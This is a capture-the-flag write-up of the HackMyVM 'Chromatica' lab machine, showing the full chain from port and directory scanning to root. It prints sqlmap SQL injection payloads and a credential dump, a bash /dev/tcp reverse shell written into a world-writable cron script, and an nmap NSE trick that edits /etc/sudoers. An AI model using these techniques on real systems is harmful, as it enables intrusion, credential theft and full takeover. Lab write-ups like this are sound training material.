# Chromatica

## Executive Summary
| Machine | Author | Category | Platform |
| :--- | :--- | :--- | :--- |
| Chromatica | josemlwdf | Beginner | HackMyVM |

**Summary:** The exploitation of Chromatica begins with a thorough web enumeration phase that uncovers a hidden development portal protected by a simple User Agent check. Upon gaining access to this portal, a vulnerable search parameter is identified as susceptible to SQL injection, allowing for the exfiltration of the backend database and the recovery of multiple user credentials. Although SSH access is initially restricted by a decorative banner environment, a classic terminal escape technique facilitates a full interactive shell. Lateral movement to the analyst account is achieved by hijacking a world writable maintenance script executed via a system wide cronjob. The final escalation to root privileges is performed by leveraging the analyst's sudo permissions over the nmap binary, using its internal scripting engine to modify the sudoers configuration and grant absolute control over the target system.

---

## Reconnaissance

The initial phase involved scanning the local network to identify the target IP address. A PowerShell script was utilized for this purpose, locating the machine within the virtual environment.

```powershell
PS D:\hackmyvm\machines> D:\CTF_Tools\ScanNetwork-CTF.ps1
[*] Your IP  : 192.168.100.1
[*] Scanning : 192.168.100.0/24
[*] Status   : Pinging hosts...

[+] Virtual Targets Found:
------------------------------------------------------------

IP              MAC               Vendor
--              ---               ------
192.168.100.187 08:00:27:BF:07:27 VirtualBox
```

Once the target IP was confirmed as 192.168.100.187, a comprehensive Nmap scan was conducted to identify open ports and services.

```bash
┌──(ouba㉿CLIENT-DESKTOP)-[/tmp/chromatica]
└─$ nmap -sV -sC -p- 192.168.100.187 -T4
Starting Nmap 7.95 ( https://nmap.org ) at 2026-05-10 21:47 WIB
Nmap scan report for 192.168.100.187
Host is up (0.0042s latency).
Not shown: 65532 closed tcp ports (reset)
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.1 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   256 7c:94:7f:cb:4a:d5:8b:9f:9e:ff:7b:7a:59:ff:75:b5 (ECDSA)
|_  256 ed:94:2a:fc:30:30:cc:07:ae:27:7d:ca:92:01:49:31 (ED25519)
80/tcp   open  http    Apache httpd 2.4.52 ((Ubuntu))
|_http-title: Chromatica|Coming Soon.....
|_http-server-header: Apache/2.4.52 (Ubuntu)
5353/tcp open  domain  (generic dns response: REFUSED)
| dns-nsid:
|_  bind.version: dnsmasq-2.86
| fingerprint-strings:
|   DNS-SD-TCP:
|     _services
|     _dns-sd
|     _udp
|_    local
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port5353-TCP:V=7.95%I=7%D=5/10%Time=6A009A86%P=x86_64-pc-linux-gnu%r(DN
SF:S-SD-TCP,30,"\0\.\0\0\x80\x85\0\x01\0\0\0\0\0\0\t_services\x07_dns-sd\x
SF:04_udp\x05local\0\0\x0c\0\x01");
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 35.15 seconds
```

The scan reveals a standard web server on port 80 and SSH on port 22. A web directory enumeration was performed using feroxbuster to uncover hidden assets.

```bash
┌──(ouba㉿CLIENT-DESKTOP)-[/tmp/chromatica]
└─$ feroxbuster -u http://192.168.100.187/ -w /usr/share/wordlists/seclists/Discovery/Web-Content/DirBuster-2007_directory-list-2.3-big.txt -x php,txt,html

 ___  ___  __   __     __      __         __   ___
|__  |__  |__) |__) | /  `    /  \ \_/ | |  \ |__
|    |___ |  \ |  \ | \__,    \__/ / \ | |__/ |___
by Ben "epi" Risher 🤓                 ver: 2.13.0
───────────────────────────┬──────────────────────
 🎯  Target Url            │ http://192.168.100.187/
 🚩  In-Scope Url          │ 192.168.100.187
 🚀  Threads               │ 50
 📖  Wordlist              │ /usr/share/wordlists/seclists/Discovery/Web-Content/DirBuster-2007_directory-list-2.3-big.txt
 👌  Status Codes          │ All Status Codes!
 💥  Timeout (secs)        │ 7
 🦡  User-Agent            │ feroxbuster/2.13.0
 💉  Config File           │ /etc/feroxbuster/ferox-config.toml
 🔎  Extract Links         │ true
 💲  Extensions            │ [php, txt, html]
 🏁  HTTP methods          │ [GET]
 🔃  Recursion Depth       │ 4
 🎉  New Version Available │ https://github.com/epi052/feroxbuster/releases/latest
───────────────────────────┴──────────────────────
 🏁  Press [ENTER] to use the Scan Management Menu™
──────────────────────────────────────────────────
404      GET        9l       31w      277c Auto-filtering found 404-like response and created new filter; toggle off with --dont-filter
403      GET        9l       28w      280c Auto-filtering found 404-like response and crea[>---------[>-------------301      GET        9l       28w      319c http://192.168.100.187/assets => http://192.168.100.187/assets/
200      GET     1521l     7816w   611312c http://192.168.100.187/assets/img/bg-mobile-fallback.jpg
301      GET        9l       28w      316c http://192.168.100.187/css => http://192.168.100.187/css/
200      GET      256l      720w     9038c http://192.168.100.187/css/google_font_1.css
200      GET       68l      301w     4047c http://192.168.100.187/index.html
301      GET        9l       28w      315c http://192.168.100.187/js => http://192.168.100.187/js/
200      GET        7l       36w      321c http://192.168.100.187/js/scripts.js
200      GET        7l     1031w    78129c http://192.168.100.187/js/bootstrap.bundle.min.js
301      GET        9l       28w      323c http://192.168.100.187/javascript => http://192.168.100.187/javascript/
200      GET    11431l    21730w   209654c http://192.168.100.187/css/styles.css
200      GET       96l      360w     4139c http://192.168.100.187/css/google_font_2.css
200      GET        2l        4w       36c http://192.168.100.187/robots.txt
200      GET        6l   197380w  1725245c http://192.168.100.187/js/all.js
200      GET       68l      301w     4047c http://192.168.100.187/
200      GET    16267l    95710w  4194304c http://192.168.100.187/assets/mp4/bg.mp4 (truncated to size limit)
```

The robots.txt file contains a directive suggesting the existence of a developer portal, but it requires a specific User Agent.

```bash
┌──(ouba㉿CLIENT-DESKTOP)-[/tmp/chromatica]
└─$ curl -s http://192.168.100.187/robots.txt
user-agent: dev
Allow: /dev-portal/
```

## Initial Access

1. Accessing the portal with the appropriate User Agent reveals a search interface.

```bash
┌──(ouba㉿CLIENT-DESKTOP)-[/tmp/chromatica]
└─$ curl http://192.168.100.187/dev-portal/ -H "User-Agent: dev"
<!DOCTYPE html>
<html>
<head>
        <title>Chromatica</title>
        <meta name="viewport" content="width=device-width, initial-scale=1.0">
        <link rel="stylesheet" href="css/style.css">
</head>
<body>
        <div class="background-image"></div>
        <div class="container">
                <h1> Search</h1>
                <form action="search.php" method="get">
                        <label for="query">Chromatica</label>
                        <input type="text" id="query" name="city" placeholder="Type a city's name...">
                        <button type="submit">Go</button>
                </form>
        </div>
</body>
</html>
```

2. The search.php script was tested for SQL injection vulnerabilities using sqlmap. The tool confirmed that the city parameter is vulnerable to both time based blind and UNION based injection techniques.

```bash
┌──(ouba㉿CLIENT-DESKTOP)-[/tmp/chromatica]
└─$ sqlmap -u "http://192.168.100.187/dev-portal/search.php?city=Tokyo" --user-agent="dev" --dbs --batch
        ___
       __H__
 ___ ___[.]_____ ___ ___  {1.9.11#stable}
|_ -| . [)]     | .'| . |
|___|_  ["]_|_|_|__,|  _|
      |_|V...       |_|   https://sqlmap.org

[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program

[*] starting @ 22:00:34 /2026-05-10/

[22:00:34] [INFO] testing connection to the target URL
[22:00:34] [INFO] testing if the target URL content is stable
[22:00:35] [INFO] target URL content is stable
[22:00:35] [INFO] testing if GET parameter 'city' is dynamic
[22:00:35] [WARNING] GET parameter 'city' does not appear to be dynamic
[22:00:35] [WARNING] heuristic (basic) test shows that GET parameter 'city' might not be injectable
[22:00:35] [INFO] testing for SQL injection on GET parameter 'city'
[22:00:35] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause'
[22:00:35] [INFO] testing 'Boolean-based blind - Parameter replace (original value)'
[22:00:35] [INFO] testing 'MySQL >= 5.1 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (EXTRACTVALUE)'
[22:00:35] [INFO] testing 'PostgreSQL AND error-based - WHERE or HAVING clause'
[22:00:35] [INFO] testing 'Microsoft SQL Server/Sybase AND error-based - WHERE or HAVING clause (IN)'
[22:00:35] [INFO] testing 'Oracle AND error-based - WHERE or HAVING clause (XMLType)'
[22:00:35] [INFO] testing 'Generic inline queries'
[22:00:35] [INFO] testing 'PostgreSQL > 8.1 stacked queries (comment)'
[22:00:35] [INFO] testing 'Microsoft SQL Server/Sybase stacked queries (comment)'
[22:00:35] [INFO] testing 'Oracle stacked queries (DBMS_PIPE.RECEIVE_MESSAGE - comment)'
[22:00:35] [INFO] testing 'MySQL >= 5.0.12 AND time-based blind (query SLEEP)'
[22:00:45] [INFO] GET parameter 'city' appears to be 'MySQL >= 5.0.12 AND time-based blind (query SLEEP)' injectable
it looks like the back-end DBMS is 'MySQL'. Do you want to skip test payloads specific for other DBMSes? [Y/n] Y
for the remaining tests, do you want to include all tests for 'MySQL' extending provided level (1) and risk (1) values? [Y/n] Y
[22:00:45] [INFO] testing 'Generic UNION query (NULL) - 1 to 20 columns'
[22:00:45] [INFO] automatically extending ranges for UNION query injection technique tests as there is at least one other (potential) technique found
[22:00:45] [INFO] 'ORDER BY' technique appears to be usable. This should reduce the time needed to find the right number of query columns. Automatically extending the range for current UNION query injection technique test
[22:00:45] [INFO] target URL appears to have 4 columns in query
[22:00:45] [INFO] GET parameter 'city' is 'Generic UNION query (NULL) - 1 to 20 columns' injectable
GET parameter 'city' is vulnerable. Do you want to keep testing the others (if any)? [y/N] N
sqlmap identified the following injection point(s) with a total of 59 HTTP(s) requests:
---
Parameter: city (GET)
    Type: time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
    Payload: city=Tokyo' AND (SELECT 6867 FROM (SELECT(SLEEP(5)))tEjb) AND 'vrak'='vrak

    Type: UNION query
    Title: Generic UNION query (NULL) - 4 columns
    Payload: city=Tokyo' UNION ALL SELECT NULL,CONCAT(0x71786a7171,0x4f5747724e43635678566c4a6f655a455053424d7767515651666b4c6a726971786f58687167646e,0x7178786a71),NULL,NULL-- -
---
[22:00:45] [INFO] the back-end DBMS is MySQL
web server operating system: Linux Ubuntu 22.04 (jammy)
web application technology: Apache 2.4.52
back-end DBMS: MySQL >= 5.0.12 (MariaDB fork)
[22:00:45] [INFO] fetching database names
available databases [2]:
[*] Chromatica
[*] information_schema

[22:00:45] [WARNING] HTTP error codes detected during run:
500 (Internal Server Error) - 27 times
[22:00:45] [INFO] fetched data logged to text files under '/home/ouba/.local/share/sqlmap/output/192.168.100.187'
[22:00:45] [WARNING] your sqlmap version is outdated

[*] ending @ 22:00:45 /2026-05-10/
```

3. With the database accessible, a dump of the users table was performed to recover credentials.

```bash
┌──(ouba㉿CLIENT-DESKTOP)-[/tmp/chromatica]
└─$ sqlmap -u "http://192.168.100.187/dev-portal/search.php?city=Tokyo" --user-agent="dev" -D Chromatica --batch --dump
        ___
       __H__
 ___ ___[,]_____ ___ ___  {1.9.11#stable}
|_ -| . [']     | .'| . |
|___|_  [.]_|_|_|__,|  _|
      |_|V...       |_|   https://sqlmap.org

[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program

[*] starting @ 22:01:20 /2026-05-10/

[22:01:20] [INFO] resuming back-end DBMS 'mysql'
[22:01:20] [INFO] testing connection to the target URL
sqlmap resumed the following injection point(s) from stored session:
---
Parameter: city (GET)
    Type: time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
    Payload: city=Tokyo' AND (SELECT 6867 FROM (SELECT(SLEEP(5)))tEjb) AND 'vrak'='vrak

    Type: UNION query
    Title: Generic UNION query (NULL) - 4 columns
    Payload: city=Tokyo' UNION ALL SELECT NULL,CONCAT(0x71786a7171,0x4f5747724e43635678566c4a6f655a455053424d7767515651666b4c6a726971786f58687167646e,0x7178786a71),NULL,NULL-- -
---
[22:01:20] [INFO] the back-end DBMS is MySQL
web server operating system: Linux Ubuntu 22.04 (jammy)
web application technology: Apache 2.4.52
back-end DBMS: MySQL >= 5.0.12 (MariaDB fork)
[22:01:20] [INFO] fetching tables for database: 'Chromatica'
[22:01:20] [INFO] fetching columns for table 'users' in database 'Chromatica'
[22:01:20] [INFO] fetching entries for table 'users' in database 'Chromatica'
[22:01:20] [INFO] recognized possible password hashes in column 'password'
do you want to store hashes to a temporary file for eventual further processing with other tools [y/N] N
do you want to crack them via a dictionary-based attack? [Y/n/q] Y
[22:01:20] [INFO] using hash method 'md5_generic_passwd'
what dictionary do you want to use?
[1] default dictionary file '/usr/share/sqlmap/data/txt/wordlist.tx_' (press Enter)
[2] custom dictionary file
[3] file with list of dictionary files
> 1
[22:01:20] [INFO] using default dictionary
do you want to use common password suffixes? (slow!) [y/N] N
[22:01:20] [INFO] starting dictionary-based cracking (md5_generic_passwd)
[22:01:20] [INFO] starting 4 processes
[22:01:29] [INFO] cracked password 'keeptrying' for user 'user'
Database: Chromatica
Table: users
[5 entries]
+----+-----------------------------------------------+-----------+-----------------------------+
| id | password                                      | username  | description                 |
+----+-----------------------------------------------+-----------+-----------------------------+
| 1  | 8d06f5ae0a469178b28bbd34d1da6ef3              | admin     | admin                       |
| 2  | 1ea6762d9b86b5676052d1ebd5f649d7              | dev       | developer account for taz   |
| 3  | 3dd0f70a06e2900693fc4b684484ac85 (keeptrying) | user      | user account for testing    |
| 4  | f220c85e3ff19d043def2578888fb4e5              | dev-selim | developer account for selim |
| 5  | aaf7fb4d4bffb8c8002978a9c9c6ddc9              | intern    | intern                      |
+----+-----------------------------------------------+-----------+-----------------------------+

[22:01:39] [INFO] table 'Chromatica.users' dumped to CSV file '/home/ouba/.local/share/sqlmap/output/192.168.100.187/dump/Chromatica/users.csv'
[22:01:39] [INFO] fetching columns for table 'cities' in database 'Chromatica'
[22:01:39] [INFO] fetching entries for table 'cities' in database 'Chromatica'
Database: Chromatica
Table: cities
[11 entries]
+----+---------------+------------+-------------+
| id | city          | population | postal_code |
+----+---------------+------------+-------------+
| 1  | New York City | 8336817    | 10001       |
| 2  | Los Angeles   | 3979576    | 90001       |
| 3  | Chicago       | 2693976    | 60601       |
| 4  | Houston       | 2320268    | 77001       |
| 5  | Phoenix       | 1680992    | 85001       |
| 6  | Philadelphia  | 1584064    | 19101       |
| 7  | San Antonio   | 1547253    | 78201       |
| 8  | San Diego     | 1425976    | 92101       |
| 9  | Dallas        | 1317929    | 75201       |
| 10 | San Jose      | 1030119    | 95101       |
| 11 | Paris         | 2140526    | 75001       |
+----+---------------+------------+-------------+

[22:01:39] [INFO] table 'Chromatica.cities' dumped to CSV file '/home/ouba/.local/share/sqlmap/output/192.168.100.187/dump/Chromatica/cities.csv'
[22:01:39] [INFO] fetched data logged to text files under '/home/ouba/.local/share/sqlmap/output/192.168.100.187'
[22:01:39] [WARNING] your sqlmap version is outdated

[*] ending @ 22:01:39 /2026-05-10/
```

4. The extracted MD5 hashes were cracked using online resources like CrackStation, resulting in the following credential list.

```bash
┌──(ouba㉿CLIENT-DESKTOP)-[/tmp/chromatica]
└─$ cat creds.txt
admin:adm!n
dev:flaghere
user:keeptrying
dev-selim:
intern:intern00
```

5. A brute force attack against the SSH service was conducted using hydra to verify the valid login.

```bash
┌──(ouba㉿CLIENT-DESKTOP)-[/tmp/chromatica]
└─$ hydra -C creds.txt ssh://192.168.100.187
Hydra v9.6 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).
Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2026-05-10 22:07:52
[WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4
[DATA] max 5 tasks per 1 server, overall 5 tasks, 5 login tries, ~1 try per task
[DATA] attacking ssh://192.168.100.187:22/
[22][ssh] host: 192.168.100.187   login: dev   password: flaghere
1 of 1 target successfully completed, 1 valid password found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2026-05-10 22:07:56
```

## Shell Escape

Logging in via SSH presents a decorative banner that prevents normal shell interaction.

```bash
┌──(ouba㉿CLIENT-DESKTOP)-[/tmp/chromatica]
└─$ ssh dev@192.168.100.187
dev@192.168.100.187's password:
GREETINGS,
THIS ACCOUNT IS NOT A LOGIN ACCOUNT
IF YOU WANNA DO SOME MAINTENANCE ON THIS ACCOUNT YOU HAVE TO
EITHER CONTACT YOUR ADMIN
OR THINK OUTSIDE THE BOX
BE LAZY AND CONTACT YOUR ADMIN
OR MAYBE YOU SHOULD USE YOUR HEAD MORE heh,,
REGARDS

brightctf{ALM0ST_TH3R3_34897ffdf69}
Connection to 192.168.100.187 closed.
```

To escape this restricted environment, the terminal window size must be increased until the text overflows, triggering a pager like interface (likely `less`). From there, a shell can be spawned by typing `!/bin/bash`.

![](image.png)

Upon successful escape, a standard interactive shell is obtained for the dev user.

```bash
dev@Chromatica:~$ id
uid=1001(dev) gid=1001(dev) groups=1001(dev)
```

## Internal Enumeration and Lateral Movement

The system was inspected for scheduled tasks and sensitive files. A cronjob was discovered that executes a script as the analyst user every minute.

```bash
dev@Chromatica:~$ cat /etc/crontab
# ...
* *     * * *   analyst /bin/bash /opt/scripts/end_of_day.sh
#
```

Checking the permissions of the target script revealed that it is world writable, allowing for malicious modification.

```bash
dev@Chromatica:~$ ls -la /opt/scripts/
total 12
drwxrwxrwx 2 root    root    4096 Apr 18  2024 .
drwxr-xr-x 6 root    root    4096 Apr 24  2024 ..
-rwxrwxrw- 1 analyst analyst   30 May 10 15:00 end_of_day.sh
```

A reverse shell payload was injected into the script to intercept the analyst's session.

```bash
dev@Chromatica:~$ echo 'bash -i >& /dev/tcp/192.168.100.1/4444 0>&1' > /opt/scripts/end_of_day.sh
```

After a brief wait, the reverse shell connection was received on the attacker's machine.

```bash
┌──(ouba㉿CLIENT-DESKTOP)-[/tmp/chromatica]
└─$ nc -lvnp 4444
listening on [any] 4444 ...
connect to [172.20.131.21] from (UNKNOWN) [172.20.128.1] 50334
bash: cannot set terminal process group (2364): Inappropriate ioctl for device
bash: no job control in this shell
analyst@Chromatica:~$ id
uid=1002(analyst) gid=1002(analyst) groups=1002(analyst)
```

The shell was then upgraded to a full TTY for better stability.

```bash
analyst@Chromatica:~$ python3 -c 'import pty;pty.spawn("/bin/bash")'
analyst@Chromatica:~$ ^Z
[1]  + continued  nc -lvnp 4444

analyst@Chromatica:~$ export SHELL=/bin/bash
analyst@Chromatica:~$ export TERM=xterm
analyst@Chromatica:~$ stty rows 75 cols 110
```

## Privilege Escalation

Checking sudo permissions for the analyst user revealed that they could execute nmap with root privileges without a password.

```bash
analyst@Chromatica:~$ sudo -l
Matching Defaults entries for analyst on Chromatica:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty

User analyst may run the following commands on Chromatica:
    (ALL : ALL) NOPASSWD: /usr/bin/nmap
```

By utilizing nmap's scripting engine (NSE), it is possible to execute Lua code as root. A script was created to append a new sudoers entry for the dev user, granting them full administrative rights.

```bash
analyst@Chromatica:~$ TF=$(mktemp)
analyst@Chromatica:~# echo 'os.execute("echo \"dev ALL=(ALL:ALL) NOPASSWD: ALL\" >> /etc/sudoers")' > $TF
analyst@Chromatica:~# sudo nmap --script=$TF
```

After the script executed, the dev user was able to elevate to root directly.

```bash
dev@Chromatica:~$ sudo -l
Matching Defaults entries for dev on Chromatica:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty

User dev may run the following commands on Chromatica:
    (ALL : ALL) NOPASSWD: ALL

dev@Chromatica:~$ sudo -i
root@Chromatica:~# id;whoami;hostname
uid=0(root) gid=0(root) groups=0(root)
root
Chromatica
```

Finally, all flags were recovered from the system.

```bash
root@Chromatica:~# grep -rn "brightctf{" /root /home 2>/dev/null
/root/root.txt:1:brightctf{DIR[REDACTED]}
/home/analyst/analyst.txt:1:brightctf{GAZETTO_RUKI_b2f4f50f398}
/home/dev/user.txt:1:brightctf{ONE[REDACTED]}
/home/dev/hello.txt:10:brightctf{ALM0ST_TH3R3_34897ffdf69}
```

---

## Attack Chain Summary
1. **Reconnaissance**: Discovered open ports 80 and 22, and identified a hidden /dev-portal/ directory via robots.txt requiring a dev User Agent.
2. **Vulnerability Discovery**: Found a UNION based SQL injection vulnerability on the city parameter within the developer portal.
3. **Exploitation**: Dumped the database to recover the dev user's credentials and used them to log in via SSH, then escaped a restricted banner environment to gain a shell.
4. **Internal Enumeration**: Identified a world writable cronjob script owned by the analyst user.
5. **Privilege Escalation**: Hijacked the cronjob to gain lateral access as analyst, then exploited sudo permissions on nmap to modify the sudoers file and achieve root access.

